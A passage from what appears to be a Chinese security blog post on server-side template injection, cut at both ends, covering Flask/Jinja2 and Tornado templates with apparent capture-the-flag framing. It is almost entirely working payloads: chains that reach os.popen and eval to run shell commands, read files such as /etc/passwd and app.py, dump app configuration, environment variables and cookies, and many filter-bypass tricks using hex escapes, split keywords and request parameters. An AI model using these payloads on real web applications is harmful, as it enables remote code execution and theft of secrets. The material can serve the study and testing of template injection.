class="hljs-name">g.pop</span>[&#x27;__global&#x27;&#x27;s__&#x27;].__builtins__.eval(<span class="hljs-name">&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">#目录扫描</span><br><span class="language-xml"># <span class="hljs-tag">&lt;<span class="hljs-name">class</span> &#x27;<span class="hljs-attr">_frozen_importlib._ModuleLock</span>&#x27;&gt;</span></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()[75].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](<span class="hljs-name">&#x27;os&#x27;</span>).listdir(<span class="hljs-name">&#x27;/&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__base__.__subclasses__</span>()[104].__init__.__globals__[&quot;__builtins__&quot;][&quot;__imp&quot;&quot;ort__&quot;](<span class="hljs-name">&quot;o&quot;</span><span class="hljs-string">&quot;s&quot;</span>).listdir(<span class="hljs-name">&quot;/&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">文件读取</span><br><span class="language-xml"># <span class="hljs-tag">&lt;<span class="hljs-name">class</span> &#x27;<span class="hljs-attr">_frozen_importlib_external.FileLoader</span>&#x27;&gt;</span></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__base__.__subclasses__</span>()[91].get_data(<span class="hljs-name">0</span>, <span class="hljs-string">&quot;app.py&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"># <span class="hljs-tag">&lt;<span class="hljs-name">class</span> &#x27;<span class="hljs-attr">click.utils.LazyFile</span>&#x27;&gt;</span></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__base__.__subclasses__</span>().__getitem__(<span class="hljs-name">475</span>)(<span class="hljs-name">&#x27;flag.txt&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">这里是数字是().__class__.__base__.__subclasses__()的内容中click.utils.LazyFile的位置，从0开始算</span><br><span class="language-xml">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="language-xml">&#123;% if &#x27;FileLoader&#x27; in c.__name__ %&#125;</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">c</span>[&quot;get_data&quot;](<span class="hljs-name">0</span>, <span class="hljs-string">&quot;/flag&quot;</span>) &#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">&#123;% endif %&#125;</span><br><span class="language-xml">#获取配置</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">get_flashed_messages.__globals__</span>[&#x27;current_app&#x27;].config&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">url_for.__globals__</span>[&#x27;current_app&#x27;].config&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">#读环境变量</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;&#125;<span class="hljs-name">&#x27;&#x27;.__str__.__globals__</span>[app].__init__.__globals__[os].environ&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">#其他payload收集</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">&quot;&quot;</span>|attr(<span class="hljs-name">&quot;\x5f\x5fCLASS\x5f\x5f&quot;</span>|lower)|attr(<span class="hljs-name">&quot;\x5f\x5fBASE\x5f\x5f&quot;</span>|lower)|attr(<span class="hljs-name">&quot;\x5f\x5fsubCLASSES\x5f\x5f&quot;</span>|lower)() &#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">&#123;% for c in &quot;&quot;.__class__.__base__.__subclasses__() %&#125;&#123;% if &quot;Popen&quot; in c.__name__ %&#125;</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">c</span>|attr(<span class="hljs-name">&quot;\x5f\x5fname\x5f\x5f&quot;</span>) &#125;&#125;</span><span class="language-xml">, </span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">loop</span>|attr(<span class="hljs-name">&quot;index0&quot;</span>) &#125;&#125;</span><span class="language-xml">&#123;% endif %&#125;&#123;% endfor %&#125; //509</span><br><span class="language-xml">&#123;% for c in &quot;&quot;.__class__.__base__.__subclasses__() %&#125;&#123;% if &quot;Popen&quot; in c.__name__ %&#125;</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">c</span>(<span class="hljs-name">&quot;id&quot;</span>,<span class="hljs-attr">shell</span>=<span class="hljs-literal">True</span>,<span class="hljs-attr">stdout</span>=-1)|attr(<span class="hljs-name">&quot;communicate&quot;</span>)() &#125;&#125;</span><span class="language-xml">&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">&quot;&quot;</span>|attr(<span class="hljs-name">&quot;\x5f\x5fCLASS\x5f\x5f&quot;</span>|lower)|attr(<span class="hljs-name">&quot;\x5f\x5fBASE\x5f\x5f&quot;</span>|lower)|attr(<span class="hljs-name">&quot;\x5f\x5fsubCLASSES\x5f\x5f&quot;</span>|lower)()|attr(<span class="hljs-name">&quot;pop&quot;</span>)(<span class="hljs-name">509</span>)(<span class="hljs-name">&quot;id&quot;</span>,<span class="hljs-attr">shell</span>=<span class="hljs-literal">True</span>,<span class="hljs-attr">stdout</span>=-1)|attr(<span class="hljs-name">&quot;communicate&quot;</span>)() &#125;&#125;</span><br></code></pre></td></tr></table></figure><p>数字需要根据返回的数据进行修改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">##class位置脚本</span><br><span class="hljs-keyword">import</span> re<br><br>a = <span class="hljs-string">&quot;[&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;async_generator&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;]&quot;</span><br><br>pattern = <span class="hljs-string">r&quot;&lt;class &#x27;[^&#x27;]+&#x27;&gt;&quot;</span><br>matches = re.findall(pattern, a)<br>my_list = [<span class="hljs-keyword">match</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">in</span> matches]<br><span class="hljs-built_in">print</span>(my_list)<br><br>j = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> my_list:<br>    j += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;subprocess.Popen&#x27;</span> <span class="hljs-keyword">in</span> i:<br>        <span class="hljs-built_in">print</span>(j)<br><br></code></pre></td></tr></table></figure><p><code>__init__</code>要获取<code>__global__</code>需要这个<code>__init__</code>是重载过的才有<code>__global__</code>属性</p><p>筛选出重载过的<code>__init__</code>类的类</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">l = <span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__<span class="hljs-selector-attr">[2]</span>.<span class="hljs-built_in">__subclasses__</span>())<br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(l):<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;wrapper&#x27;</span> not <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__<span class="hljs-selector-attr">[2]</span>.<span class="hljs-built_in">__subclasses__</span>()<span class="hljs-selector-attr">[i]</span>.__init__):<br>        print (<span class="hljs-selector-tag">i</span>, <span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__<span class="hljs-selector-attr">[2]</span>.<span class="hljs-built_in">__subclasses__</span>()<span class="hljs-selector-attr">[i]</span>)<br></code></pre></td></tr></table></figure><h5 id="利用内置函数的payload"><a class="markdownIt-Anchor" href="#利用内置函数的payload"></a> 利用内置函数的payload</h5><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml"># flask</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">get_flashed_messages.__globals__</span>[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">url_for.__globals__</span>[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"># jinja2</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum.__globals__</span>[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"># 另外两个内置函数和正常逃逸一个思路</span><br></code></pre></td></tr></table></figure><p>flask的内置函数只有flask的渲染方法render_template()和render_template_string()渲染时才可使用；</p><p>jinja2的内置函数无条件，flask和jinja2的渲染方法都可使用</p><h5 id="较短的payload"><a class="markdownIt-Anchor" href="#较短的payload"></a> 较短的payload</h5><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml"># flask</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">get_flashed_messages.__globals__</span>[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">url_for.__globals__</span>[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"># jinja2</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum.__globals__</span>[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum.__globals__</span>[&quot;o&quot;&quot;s&quot;][&quot;po&quot;&quot;pen&quot;](<span class="hljs-name">&quot;pwd&quot;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum</span>[&#x27;__glob&#x27;&#x27;als__&#x27;][&#x27;__built&#x27;&#x27;ins__&#x27;][&#x27;ev&#x27;&#x27;al&#x27;](<span class="hljs-name">request.data</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">cycler.__init__.__globals__.os.popen</span>(<span class="hljs-name">&#x27;id&#x27;</span>).read()&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">joiner.__init__.__globals__.os.popen</span>(<span class="hljs-name">&#x27;id&#x27;</span>).read()&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">namespace.__init__.__globals__.os.popen</span>(<span class="hljs-name">&#x27;id&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">g.pop</span>[&#x27;__global&#x27;&#x27;s__&#x27;].__builtins__.eval(<span class="hljs-name">request.form.a</span>)&#125;&#125;</span><span class="language-xml">&amp;a=__import__(&quot;os&quot;).popen(&quot;id&quot;).read()</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">g</span>[&quot;p&quot;&quot;op&quot;][&quot;__globals__&quot;][&quot;__builtins__&quot;][&quot;__imp&quot;&quot;ort__&quot;](<span class="hljs-name">&quot;o&quot;</span><span class="hljs-string">&quot;s&quot;</span>)[&quot;po&quot;&quot;pen&quot;](<span class="hljs-name">get_flashed_messages.__globals__</span>[&quot;requ&quot;&quot;est&quot;][&quot;args&quot;][&quot;g&quot;&quot;et&quot;](<span class="hljs-name">&quot;abu&quot;</span>))[&quot;re&quot;&quot;ad&quot;]()&#125;&#125;</span><br></code></pre></td></tr></table></figure><h5 id="bypass"><a class="markdownIt-Anchor" href="#bypass"></a> bypass</h5><p><a href="https://0day.work/jinja2-template-injection-filter-bypasses/">https://0day.work/jinja2-template-injection-filter-bypasses/</a></p><p>使用以上payload有可能会遇到一些过滤</p><h6 id="过滤"><a class="markdownIt-Anchor" href="#过滤"></a> 过滤<code>.</code></h6><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">1、用[]代替.，举个例子</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__</span>&#125;&#125;</span><span class="language-xml">=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;</span>[&#x27;__class&#x27;]&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">2、用attr()过滤器绕过，举个例子</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__</span>&#125;&#125;</span><span class="language-xml">=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;</span>|attr(<span class="hljs-name">&#x27;__class__&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><h6 id="过滤_"><a class="markdownIt-Anchor" href="#过滤_"></a> 过滤<code>_</code></h6><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="language-xml">1、通过list获取字符列表，然后用pop来获取_，举个例子</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> a=(()<span class="hljs-punctuation">|</span>select<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span>list).pop(<span class="hljs-number">24</span>)<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">print</span>(a)<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml">2、可以通过十六进制编码的方式进行绕过，举个例子</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()[<span class="hljs-string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>]&#125;&#125;</span><span class="language-xml"> =</span><span class="hljs-template-variable">&#123;&#123;().__class__&#125;&#125;</span><br></code></pre></td></tr></table></figure><h6 id="过滤-2"><a class="markdownIt-Anchor" href="#过滤-2"></a> 过滤<code>[]</code></h6><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-emphasis">__bases__</span>[0]=<span class="hljs-emphasis">__bases__</span>.<span class="hljs-emphasis">__getitem__</span>(0)<br></code></pre></td></tr></table></figure><h6 id="过滤-swig28-"><a class="markdownIt-Anchor" href="#过滤-swig28-"></a> 过滤<code>&#123;&#123;`用`&#123;% %&#125;`代替`&#123;&#123;&#125;&#125;</code></h6><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">&#123;&#123;&quot;&quot;<span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__bases__</span><span class="hljs-selector-attr">[0]</span>. <span class="hljs-built_in">__subclasses__</span>()<span class="hljs-selector-attr">[138]</span><span class="hljs-selector-class">.__init__</span><span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;popen&#x27;</span>]</span>(&#x27;dir&#x27;)<span class="hljs-selector-class">.read</span>()&#125;&#125; #修改前<br>&#123;%<span class="hljs-built_in">print</span>(&quot;&quot;.__class__.__bases__[<span class="hljs-number">0</span>]. __subclasses__()<span class="hljs-selector-attr">[138]</span><span class="hljs-selector-class">.__init__</span><span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;popen&#x27;</span>]</span>(&#x27;dir&#x27;)<span class="hljs-selector-class">.read</span>())%&#125; #修改后<br></code></pre></td></tr></table></figure><h6 id="过滤-或"><a class="markdownIt-Anchor" href="#过滤-或"></a> 过滤<code>'</code> 或<code>&quot;</code></h6><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">url_for.__globals__</span>[request.args.a]&#125;&#125;</span><span class="language-xml">&amp;a=__builtins__  等同于 </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">url_for.__globals__</span>[&#x27;__builtins__&#x27;]&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>其他request方法</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 参数传递(GET|POST都可)</span><br><span class="hljs-string">&quot;&quot;</span>[request.values.x1]<br><span class="hljs-comment"># GET方法传参</span><br>&#123;&#123;<span class="hljs-string">&quot;&quot;</span>[request.args.x1]&#125;&#125;&amp;<span class="hljs-attribute">x1</span>=__class__<br><span class="hljs-comment"># POST方法传参</span><br><span class="hljs-string">&quot;&quot;</span>[request.form.x1]<br>POST: <span class="hljs-attribute">x1</span>=__class__<br><span class="hljs-comment"># headers头</span><br><span class="hljs-string">&quot;&quot;</span>[request.headers.x1]<br>x1: __class__<br><span class="hljs-comment"># User-Agent</span><br><span class="hljs-string">&quot;&quot;</span>[request.user_agent.string]<br>User-Agent: __class__<br><span class="hljs-comment"># Cookie</span><br><span class="hljs-string">&quot;&quot;</span>[request.cookies.x1]<br>Cookie: <span class="hljs-attribute">x1</span>=__class__<br></code></pre></td></tr></table></figure><h6 id="过滤数字"><a class="markdownIt-Anchor" href="#过滤数字"></a> 过滤数字</h6><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;(<span class="hljs-name">dict</span>(<span class="hljs-name">e</span>=a)|join|count)&#125;&#125;</span><span class="language-xml"> #获取数字1</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;(<span class="hljs-name">dict</span>(<span class="hljs-name">ee</span>=a)|join|count)&#125;&#125;</span><span class="language-xml"> #获取数字2</span><br></code></pre></td></tr></table></figure><h6 id="过滤关键字"><a class="markdownIt-Anchor" href="#过滤关键字"></a> 过滤关键字</h6><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">class  .__class__=[&#x27;__cla&#x27;+&#x27;ss__&#x27;] </span><br><span class="language-xml">init </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">dict</span>(<span class="hljs-name">__in</span>=a,<span class="hljs-attr">it__</span>=a)|join&#125;&#125;</span><span class="language-xml">  =__init__</span><br><span class="language-xml">若在双引号里面则拆分绕过</span><br></code></pre></td></tr></table></figure><p><a href="https://github.com/X3NNY/sstilabs">靶场</a></p><p><a href="https://blog.51cto.com/u_15847702/5976200">https://blog.51cto.com/u_15847702/5976200</a></p><h4 id="tornado模板注入"><a class="markdownIt-Anchor" href="#tornado模板注入"></a> tornado模板注入</h4><h5 id="基本语法"><a class="markdownIt-Anchor" href="#基本语法"></a> 基本语法</h5><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml">   <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span></span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">title</span> &#125;&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml">   <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">   <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml">     <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span></span><br><span class="language-xml">       &#123;% for item in items %&#125;</span><br><span class="language-xml">         <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span></span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">escape</span>(<span class="hljs-name">item</span>) &#125;&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><br><span class="language-xml">       &#123;% end %&#125;</span><br><span class="language-xml">     <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span><br><span class="language-xml">   <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"> <span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure><img src="/2023/06/11/SSTI/2.jpg" class=""><p><a href="https://tornado-zh.readthedocs.io/zh/latest/guide/templates.html">官方文档</a></p><h5 id="变量别名"><a class="markdownIt-Anchor" href="#变量别名"></a> 变量别名</h5><img src="/2023/06/11/SSTI/3.jpg" class=""><h5 id="payload"><a class="markdownIt-Anchor" href="#payload"></a> payload</h5><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">&#123;% extends &quot;/etc/passwd&quot;%&#125; #文件读取</span><br><span class="language-xml">&#123;% include &quot;/etc/passwd&quot;%&#125; #文件读取</span><br><span class="language-xml">&#123;% import os %&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">os.popen</span>(<span class="hljs-name">&quot;ls&quot;</span>).read()&#125;&#125;</span><span class="language-xml"> #引入模块实现rce</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">handler.__init__.__globals__</span>[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](<span class="hljs-name">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">handler.get_argument</span>(<span class="hljs-name">&#x27;yu&#x27;</span>)&#125;&#125;</span><span class="language-xml">   //比如传入?yu=123则返回值为123</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">handler.cookies</span>&#125;&#125;</span><span class="language-xml">  //返回cookie值</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">handler.get_cookie</span>(<span class="hljs-name">&quot;data&quot;</span>)&#125;&#125;</span><span class="language-xml">  //返回cookie中data的值</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">handler.decode_argument</span>(<span class="hljs-name">&#x27;\u0066&#x27;</span>)&#125;&#125;</span><span class="language-xml">  //返回f，其中\u0066为f的unicode编码</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">handler.get_query_argument</span>(<span class="hljs-name">&#x27;yu&#x27;</span>)&#125;&#125;</span><span class="language-xml">  //比如传入?yu=123则返回值为123</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">handler.settings</span>&#125;&#125;</span><span class="language-xml">  //比如传入application.settings中的值</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">request.method</span>&#125;&#125;</span><span class="language-xml">  //返回请求方法名  GET|POST|PUT...</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">request.query</span>&#125;&#125;</span><span class="language-xml">  //传入?a=123 则返回a=123</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">request.arguments</span>&#125;&#125;</span><span class="language-xml">   //返回所有参数组成的字典</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">request.cookies</span>&#125;&#125;</span><span class="language-xml">   //同</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">handler.cookies</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">globals</span>()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">eval</span>(<span class="hljs-name">&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">jinjia2的payload</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">handler.application.default_router.add_rules</span>(<span class="hljs-name">[[&quot;123&quot;,&quot;os.po&quot;+&quot;pen&quot;,&quot;a&quot;,&quot;345&quot;]</span>])&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">handler.application.default_router.named_rules</span>[&#x27;345&#x27;].target(<span class="hljs-name">&#x27;/readflag&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><h5 id="过滤_-2"><a class="markdownIt-Anchor" href="#过滤_-2"></a> 过滤<code>_</code></h5><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">eval</span>(<span class="hljs-name">handler.get_argument</span>(<span class="hljs-name">&#x27;yu&#x27;</span>))&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">?yu=__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()</span><br></code></pre></td></tr></table></figure><h5 id="过滤-3"><a class="markdownIt-Anchor" href="#过滤-3"></a> 过滤<code>'</code></h5><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">eval</span>(<span class="hljs-name">handler.get_argument</span>(<span class="hljs-name">request.method</span>))&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">?GET=__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()</span><br><span class="language-xml">?POST=__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()</span><br></code></pre></td></tr></table></figure><h5 id="过滤-4"><a class="markdownIt-Anchor" href="#过滤-4"></a> 过滤<code>()</code></h5><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-title function_">print</span>(&#x27;&#x27;.<span class="hljs-property">join</span>([&#x27;\\<span class="hljs-title function_">x</span>&#123;:<span class="hljs-number">02</span>x&#125;&#x27;.<span class="hljs-property">format</span>(<span class="hljs-title 